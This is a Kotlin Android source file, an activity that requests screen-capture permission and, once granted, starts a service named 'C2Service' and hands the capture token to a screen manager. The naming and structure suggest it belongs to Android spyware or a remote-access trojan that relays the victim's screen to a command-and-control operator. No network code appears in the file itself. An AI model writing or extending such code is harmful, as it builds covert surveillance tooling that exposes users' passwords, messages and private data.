package com.t.core
import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
class CaptureActivity : Activity() {
    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        runCatching { startActivityForResult(getSystemService(MediaProjectionManager::class.java).createScreenCaptureIntent(), 1) }.onFailure { finish() }
    }
    override fun onActivityResult(req: Int, code: Int, data: Intent?) {
        if (code == RESULT_OK && data != null) {
            VC.startFg(this, Intent(this, C2Service::class.java))
            Handler(Looper.getMainLooper()).postDelayed({ ScreenMgr.start(applicationContext, code, data) }, 800)
        }
        finish()
    }
}
